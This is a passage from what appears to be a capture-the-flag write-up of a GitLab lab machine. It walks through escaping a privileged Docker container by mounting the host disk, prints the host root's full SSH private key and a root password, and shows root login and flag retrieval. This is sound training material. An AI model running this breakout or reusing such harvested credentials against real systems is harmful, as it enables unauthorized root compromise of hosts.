<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#ae81ff">git@gitlab:/opt/backup$ cat docker-compose.yml </span>
<span style="color:#f92672">version</span>: <span style="color:#e6db74">&#39;2.4&#39;</span>

<span style="color:#f92672">services</span>:
  <span style="color:#f92672">web</span>:
    <span style="color:#f92672">image</span>: <span style="color:#e6db74">&#39;gitlab/gitlab-ce:11.4.7-ce.0&#39;</span>
    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">always</span>
    <span style="color:#f92672">hostname</span>: <span style="color:#e6db74">&#39;gitlab.example.com&#39;</span>
    <span style="color:#f92672">environment</span>:
      <span style="color:#f92672">GITLAB_OMNIBUS_CONFIG</span>: |<span style="color:#e6db74">
</span><span style="color:#e6db74">        external_url &#39;http://172.19.0.2&#39;
</span><span style="color:#e6db74">        redis[&#39;bind&#39;]=&#39;127.0.0.1&#39;
</span><span style="color:#e6db74">        redis[&#39;port&#39;]=6379
</span><span style="color:#e6db74">        gitlab_rails[&#39;initial_root_password&#39;]=File.read(&#39;/root_pass&#39;)</span>        
    <span style="color:#f92672">networks</span>:
      <span style="color:#f92672">gitlab</span>:
        <span style="color:#f92672">ipv4_address</span>: <span style="color:#ae81ff">172.19.0.2</span>
    <span style="color:#f92672">ports</span>:
      - <span style="color:#e6db74">&#39;5080:80&#39;</span>
      <span style="color:#75715e">#- &#39;127.0.0.1:5080:80&#39;</span>
      <span style="color:#75715e">#- &#39;127.0.0.1:50443:443&#39;</span>
      <span style="color:#75715e">#- &#39;127.0.0.1:5022:22&#39;</span>
    <span style="color:#f92672">volumes</span>:
      - <span style="color:#e6db74">&#39;./srv/gitlab/config:/etc/gitlab&#39;</span>
      - <span style="color:#e6db74">&#39;./srv/gitlab/logs:/var/log/gitlab&#39;</span>
      - <span style="color:#e6db74">&#39;./srv/gitlab/data:/var/opt/gitlab&#39;</span>
      - <span style="color:#e6db74">&#39;./root_pass:/root_pass&#39;</span>
    <span style="color:#f92672">privileged</span>: <span style="color:#66d9ef">true</span> <span style="color:#75715e"># ==&gt; Potential privesc vector</span>
    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">unless-stopped</span>
    <span style="color:#75715e">#mem_limit: 1024m</span>

<span style="color:#f92672">networks</span>:
  <span style="color:#f92672">gitlab</span>:
    <span style="color:#f92672">driver</span>: <span style="color:#ae81ff">bridge</span>
    <span style="color:#f92672">ipam</span>:
      <span style="color:#f92672">config</span>:
        - <span style="color:#f92672">subnet</span>: <span style="color:#ae81ff">172.19.0.0</span><span style="color:#ae81ff">/16</span>
</code></pre></div><h4 id="su---root-container">su - root (container)</h4>
<p>The password <code>wW59U!ZKMbG9+*#h</code> works on the container root account</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">git@gitlab:/opt/gitlab$ su root
Password: wW59U!ZKMbG9+*#h
root@gitlab:/opt/gitlab# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div><h4 id="docker-breakout">Docker Breakout</h4>
<p>Based on the <code>docker-compose.yml</code> file, I suspect the container is running with privileged flag. According to my favorite blog, which is <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#">BookHackTrick</a>, a container with privileged flag will have access to the host devices.</p>
<p>Although, <code>--privileged</code> gives all the Linux capabilities, I&rsquo;ll still check it manually to make sure I have access to the host devices.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@gitlab:/opt/gitlab# capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eip
...&lt;SNIP&gt;...
</code></pre></div><p>There is a <code>CAP_SYS_ADMIN</code>, with this capabilities I&rsquo;m able to mount the host devices to make it available on the container. I can list all the host devices with <code>fdisk -l</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@gitlab:~# fdisk -l

...&lt;SNIP&gt;...
Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: 32558524-85A4-4072-AA28-FA341BE86C2E

Device        Start      End  Sectors Size Type
/dev/sda1      2048     4095     2048   1M BIOS boot
/dev/sda2      4096 37746687 37742592  18G Linux filesystem # the root (/) dir
/dev/sda3  37746688 41940991  4194304   2G Linux swap
</code></pre></div><p>Now I can simply mount the Linux filesystem (<code>/dev/sda2</code>) to my specified folder.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@gitlab:/media# mkdir iamf
root@gitlab:/media# mount /dev/sda2 /media/iamf
root@gitlab:/media# ls iamf/
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
</code></pre></div><p>The root user of the host has SSH keys, I’ll grab only the private key to my machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@gitlab:/media# ls -l iamf/root/.ssh/ 
total 12
-rw------- 1 root root  405 Dec  7 16:49 authorized_keys
-rw------- 1 root root 1675 Dec  7 16:49 id_rsa
-rw-r--r-- 1 root root  405 Dec  7 16:49 id_rsa.pub
root@gitlab:/media# cat iamf/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf
YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX
TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W
rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011
YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof
Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf
iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+
lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab
VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu
K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL
g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2
3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy
n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8
kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1
KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff
Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B
MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab
dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v
DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa
bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r
ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv
aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz
vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
-----END RSA PRIVATE KEY-----
</code></pre></div><h4 id="ssh-access---root-host">SSH Access - root (host)</h4>
<p>After changing the key permissions to 600, I can login as root user.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «ssh-key» «10.10.14.20» 
$ chmod 600 root_rsa 
→ root@kali «ssh-key» «10.10.14.20» 
$ ssh -i root_rsa root@10.10.10.220
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

...&lt;SNIP&gt;..
  System load:                      0.05
  Usage of /:                       67.1% of 17.59GB
  Memory usage:                     84%
  Swap usage:                       4%
  Processes:                        434
  Users logged in:                  0
  IPv4 address for br-bcb73b090b3f: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.220
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:211

...&lt;SNIP&gt;..
Last login: Thu Feb 11 14:28:18 2021
root@ready:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ready:~# ls -l
total 16
drwxr-xr-x  3 root root 4096 Dec  1 12:41 docker-gitlab
drwxr-xr-x 10 root root 4096 Jul  9  2020 ready-channel
-r--------  1 root root   33 Jul  8  2020 root.txt
drwxr-xr-x  3 root root 4096 May 18  2020 snap
</code></pre></div><p>I can also grab the root flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@ready:~# cut -c-15 root.txt 
b7f98681505cd39
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/</a></li>
<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
